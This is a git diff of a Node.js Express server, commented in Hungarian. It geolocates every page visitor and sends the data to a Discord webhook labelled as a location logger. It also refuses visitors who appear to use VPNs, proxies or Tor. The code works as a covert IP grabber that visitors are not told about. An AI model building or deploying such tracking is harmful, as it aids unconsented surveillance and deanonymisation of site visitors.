@@ -10,8 +10,6 @@ const PORT = process.env.PORT || 3000;
 const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
 const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
 
-app.use(express.static('public'));
-
 // ---- Magyarosított formázó minden fontos adattal ----
 function formatGeoDataMagyar(geo) {
   if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
@@ -75,6 +73,65 @@ async function getGeo(ip) {
   }
 }
 
+// --- VPN/Proxy/TOR blokkoló, helyes típuskényszerítéssel! ---
+function isBlockedByVpnProxyTor(geoData) {
+  // Az ipwhois.app néha "true"/"false" stringet ad vissza, ezért pontosan vizsgálunk
+  const check = val => val === true || val === "true";
+  return check(geoData.proxy) || check(geoData.vpn) || check(geoData.tor);
+}
+
+// --- Főoldal (/) logolás, mindig működik ---
+app.get('/', async (req, res) => {
+  const ip = getClientIp(req);
+  const geoData = await getGeo(ip);
+
+  if (isBlockedByVpnProxyTor(geoData)) {
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+  }
+
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /\n` + formatGeoDataMagyar(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  res.sendFile(path.join(__dirname, 'public/index.html'));
+});
+
+// --- Dinamikus aloldalak (/kecske, /barmi) logolása ---
+app.get('/:page', async (req, res, next) => {
+  const pageName = req.params.page;
+  if (pageName === 'report') return next();
+
+  const filePath = path.join(__dirname, 'public', pageName + '.html');
+  if (!fs.existsSync(filePath)) return next();
+
+  const ip = getClientIp(req);
+  const geoData = await getGeo(ip);
+
+  if (isBlockedByVpnProxyTor(geoData)) {
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+  }
+
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /${pageName}\n` + formatGeoDataMagyar(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  res.sendFile(filePath);
+});
+
 // --- Gyanús tevékenység reportolása ---
 app.post('/report', express.json(), async (req, res) => {
   const ip = getClientIp(req);
@@ -90,7 +147,6 @@ app.post('/report', express.json(), async (req, res) => {
       description:
         `**Oldal:** ${page || 'Ismeretlen'}\n` +
         `**Művelet:** ${reason}\n` +
-        `**IP-cím:** ${ip}\n` +
         formatGeoDataMagyar(geoData),
       color: 0x800080
     }]
@@ -99,39 +155,8 @@ app.post('/report', express.json(), async (req, res) => {
   res.json({ ok: true });
 });
 
-// --- Statikus fájlok kiszolgálása (pl. képek, CSS, JS) ---
+// --- Statikus fájlok kiszolgálása (csak a saját route-ok után!) ---
 app.use(express.static('public'));
-
-// --- Főoldal és minden egyéb dinamikus oldal logolása ---
-app.get(['/', '/:page'], async (req, res, next) => {
-  let pageName = req.path === '/' ? 'index' : req.params.page;
-  const filePath = path.join(__dirname, 'public', pageName + '.html');
-  if (!fs.existsSync(filePath)) return next();
-
-  const ip = getClientIp(req);
-  const geoData = await getGeo(ip);
-
-  // --- VPN/Proxy/TOR blokkolás ---
-  if (geoData.proxy || geoData.vpn || geoData.tor) {
-    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
-  }
-
-  axios.post(MAIN_WEBHOOK, {
-    username: "Helyszíni Naplózó <3",
-    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-    content: '',
-    embeds: [{
-      title: 'Új látogató az oldalon!',
-      description:
-        `**Oldal:** /${pageName === 'index' ? '' : pageName}\n` +
-        `**IP-cím:** ${ip}\n` +
-        formatGeoDataMagyar(geoData),
-      color: 0x800080
-    }]
-  }).catch(()=>{});
-
-  res.sendFile(filePath);
-});
 
 // --- 404 minden másra ---
 app.use((req, res) => {
